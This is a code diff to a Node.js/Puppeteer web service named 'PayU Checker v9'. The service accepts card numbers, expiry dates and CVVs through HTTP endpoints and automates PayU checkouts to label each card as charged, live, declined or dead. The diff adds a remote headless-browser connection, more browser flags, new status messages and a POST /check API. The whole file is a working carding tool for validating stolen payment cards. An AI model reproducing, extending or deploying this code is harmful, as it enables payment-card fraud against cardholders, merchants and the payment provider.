@@ -1,4 +1,4 @@
-const puppeteer = require('puppeteer');
+const puppeteer = require('puppeteer-core');
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
@@ -9,14 +9,45 @@ if (!fs.existsSync(SCREENSHOT_DIR)) {
     fs.mkdirSync(SCREENSHOT_DIR, { recursive: true });
 }
 
+// Browserless configuration
+const BROWSERLESS_TOKEN = process.env.BROWSERLESS_TOKEN || '';
+const USE_BROWSERLESS = !!BROWSERLESS_TOKEN;
+
 async function testCC(cc) {
     let browser;
     
     try {
-        browser = await puppeteer.launch({
-            headless: 'new',
-            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
-        });
+        // Connect to Browserless or launch locally
+        if (USE_BROWSERLESS) {
+            console.log('[*] Connecting to Browserless...');
+            browser = await puppeteer.connect({
+                browserWSEndpoint: `wss://chrome.browserless.io?token=${BROWSERLESS_TOKEN}`
+            });
+        } else {
+            console.log('[*] Launching local browser...');
+            browser = await puppeteer.launch({
+                headless: 'new',
+                args: [
+                    '--no-sandbox',
+                    '--disable-setuid-sandbox',
+                    '--disable-dev-shm-usage',
+                    '--disable-gpu',
+                    '--disable-software-rasterizer',
+                    '--disable-extensions',
+                    '--disable-background-networking',
+                    '--disable-default-apps',
+                    '--disable-sync',
+                    '--disable-translate',
+                    '--hide-scrollbars',
+                    '--metrics-recording-only',
+                    '--mute-audio',
+                    '--no-first-run',
+                    '--safebrowsing-disable-auto-update'
+                ],
+                executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/chromium-browser',
+                timeout: 60000
+            });
+        }
         
         const page = await browser.newPage();
         await page.setViewport({width: 1280, height: 900});
@@ -220,7 +251,7 @@ async function testCC(cc) {
                     // Success page
                     if (pageText.includes('success') || pageText.includes('thank you') || 
                         pageText.includes('payment received') || pageText.includes('payment successful')) {
-                        status = 'CHARGED'; msg = 'Payment Successful ✅';
+                        status = 'CHARGED'; msg = '( Thanks for your purchase! ✅ )';
                         console.log('[9.1] Payment successful');
                         break;
                     }
@@ -250,7 +281,7 @@ async function testCC(cc) {
                     break;
                 }
                 if (pageText.includes('declined') || pageText.includes('transaction declined')) {
-                    status = 'DECLINED'; msg = 'Card Declined ❌';
+                    status = 'DECLINED'; msg = 'CARD_DECLINED';
                     console.log('[9.2] Card declined on PayU');
                     break;
                 }
@@ -263,7 +294,7 @@ async function testCC(cc) {
                 
                 // Check for generic errors
                 if (pageText.includes('error') || pageText.includes('failed')) {
-                    status = 'DECLINED'; msg = 'Transaction Error ❌';
+                    status = 'DECLINED'; msg = 'CARD_DECLINED';
                     console.log('[9.2] Generic error on PayU');
                     break;
                 }
@@ -293,7 +324,7 @@ async function testCC(cc) {
                 if (!finalUrl.includes('payu')) {
                     // Check for errors first
                     if (pageText.includes('fail') || pageText.includes('decline') || pageText.includes('error')) {
-                        status = 'DECLINED'; msg = 'Transaction Failed ❌';
+                        status = 'DECLINED'; msg = 'CARD_DECLINED';
                     } else if (pageText.includes('invalid') || pageText.includes('incorrect')) {
                         status = 'DEAD'; msg = 'Invalid Card Details ❌';
                     } else if (finalUrl.includes('3d') || finalUrl.includes('challenge') || finalUrl.includes('secure') ||
@@ -301,20 +332,20 @@ async function testCC(cc) {
                         pageText.includes('otp') || pageText.includes('verify') || pageText.includes('authentication')) {
                         status = 'LIVE'; msg = '3D Secure Required 🔐';
                     } else if (pageText.includes('success') || pageText.includes('thank')) {
-                        status = 'CHARGED'; msg = 'Payment Successful ✅';
+                        status = 'CHARGED'; msg = '( Thanks for your purchase! ✅ )';
                     } else {
                         // Redirected but unclear - likely declined
-                        status = 'DECLINED'; msg = 'Bank Declined ❌';
+                        status = 'DECLINED'; msg = 'CARD_DECLINED';
                     }
                 } else {
                     // Still on PayU
                     if (pageText.includes('invalid') || pageText.includes('incorrect')) {
                         status = 'DEAD'; msg = 'Invalid Card ❌';
                     } else if (pageText.includes('decline') || pageText.includes('error')) {
-                        status = 'DECLINED'; msg = 'Declined ❌';
+                        status = 'DECLINED'; msg = 'CARD_DECLINED';
                     } else {
                         // No clear response - likely declined
-                        status = 'DECLINED'; msg = 'No Response (Declined) ❌';
+                        status = 'DECLINED'; msg = 'CARD_DECLINED';
                     }
                 }
             }
@@ -338,12 +369,37 @@ async function testCC(cc) {
     }
 }
 
+app.use(express.json());
 app.use('/screenshots', express.static(SCREENSHOT_DIR));
+
+// POST endpoint for /check
+app.post('/check', async (req, res) => {
+    const { cc, mm, yyyy, cvv } = req.body;
+    if (!cc || !mm || !yyyy || !cvv) {
+        return res.json({status: 'ERROR', message: 'Missing parameters'});
+    }
+    const result = await testCC({number: cc, month: mm, year: yyyy, cvv: cvv});
+    res.json(result);
+});
+
+// GET endpoint for /payu (backward compatibility)
 app.get('/payu', async (req, res) => {
     const cc = req.query.cc;
     if (!cc || !cc.includes('|')) return res.json({status: 'error', message: 'Format: cc=num|mm|yy|cvv'});
     const [number, month, year, cvv] = cc.split('|');
     res.json(await testCC({number, month, year, cvv}));
 });
-app.get('/', (req, res) => res.send('PayU Checker v9'));
-app.listen(5000, '0.0.0.0', () => console.log('[*] PayU Checker v9 on port 5000'));
+
+app.get('/', (req, res) => res.json({
+    status: 'online',
+    version: 'v9',
+    endpoints: {
+        check: 'POST /check',
+        payu: 'GET /payu?cc=num|mm|yy|cvv'
+    }
+}));
+
+app.get('/health', (req, res) => res.json({status: 'ok', timestamp: Date.now()}));
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, '0.0.0.0', () => console.log(`[*] PayU Checker v9 on port ${PORT}`));
